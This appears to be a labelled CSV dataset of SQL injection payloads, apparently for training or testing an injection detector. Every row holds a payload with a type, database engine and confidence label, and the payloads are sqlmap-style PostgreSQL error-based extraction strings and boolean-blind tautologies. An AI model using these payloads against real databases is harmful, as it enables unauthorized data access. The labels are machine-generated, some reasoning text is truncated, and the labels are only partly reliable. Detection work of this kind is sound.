id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
38544,"select * from users WHERE username = ""1"" or username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'"" or username = ""-1254"" and username = ""1",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38545,"1\' ) ) or username = ""1 ) ) ) and ( ( ( 4694 = 4694"" and username = ""-9987 ) ) ) or ( ( ( 2114 = 2114",unknown,generic,0.50,Insufficient data to classify payload type,1
38546,"1 where 5161 = 5161 and username = ""-1641\' ) ) or username = ""-2733\' ) ) ) and ( ( ( \'btjx\' = \'btjx",unknown,generic,0.50,Insufficient data to classify payload type,1
38547,"-5863"" and ( ( \'%\' = \'"" or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
38548,"select * from users WHERE username = ""-8112\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'xopg\' = \'xopg"" and username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38549,"1 ) where 6039 = 6039 or username = ""-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg",unknown,generic,0.50,Insufficient data to classify payload type,1
38550,"select * from users WHERE username = ""1\' ) ) ) and username = ""1\' ) ) or username = ""1 ) ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38551,"select * from users WHERE username = ""-1985 ) ) ) and ( ( ( 1248 = 1248"" or username = ""-1254"" and username = ""1 )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38552,"-3978 or username = ""-6203\' ) ) ) and ( ( ( \'luee\' = \'luee",unknown,generic,0.50,Insufficient data to classify payload type,1
38553,"-6523"" and ""bwrb"" like ""bwrb"" or username = ""1 ) where 6039 = 6039 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38554,"select * from users WHERE username = ""-3100\' ) and ( \'etuj\' like \'etuj"" and username = ""1\'|| ( select \'byxb\' where 8351 = 8351",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38555,"select * from users WHERE username = ""-5062 ) where 7457 = 7457 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38556,-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38557,"-9295 ) ) ) or username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""1\' ) ) ) and ( ( ( \'njge\' like \'njge",unknown,generic,0.50,Insufficient data to classify payload type,1
38558,"select * from users WHERE username = ""-7209\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1%\' ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38559,"1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 and username = ""-1190\' and \'yxry\' like \'yxry"" and ( ( ( \'xopg\' = \'xopg",unknown,generic,0.50,Insufficient data to classify payload type,1
38560,"select * from users WHERE username = ""1 ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1 ) where 6039 = 6039",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38561,"select * from users WHERE username = ""-3978 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-6036 ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38562,"select * from users WHERE username = ""-1190\' and username = ""-8860 ) and username = ""-9505\' ) ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38563,-3499\' ) ) ) and ( ( ( \'nzap\' like \'nzap,unknown,generic,0.50,Insufficient data to classify payload type,1
38564,-7710\' where 5658 = 5658 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38565,"-4248 where 3288 = 3288 or username = ""1\' ) ) and ( ( \'mmow\' = \'mmow",unknown,generic,0.50,Insufficient data to classify payload type,1
38566,1\' and \'foju\' = \'foju,unknown,generic,0.50,Insufficient data to classify payload type,1
38567,-3185\' ) ) and ( ( \'rknd\' like \'rknd,unknown,generic,0.50,Insufficient data to classify payload type,1
38568,"select * from users WHERE username = ""1 where 5161 = 5161 or username = ""1%\' ) ) ) or username = ""1\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38569,"1\' and username = ""1"" or username = ""1%\' ) ) and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
38570,"select * from users WHERE username = ""-3978 or username = ""-3899\' ) where 8152 = 8152 or username = ""-8860 ) and username = ""-2756\' where 6156 = 6156",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38571,"select * from users WHERE username = ""-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-9295 ) ) ) and username = ""-7430\' ) as xfah where 1596 = 1596",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
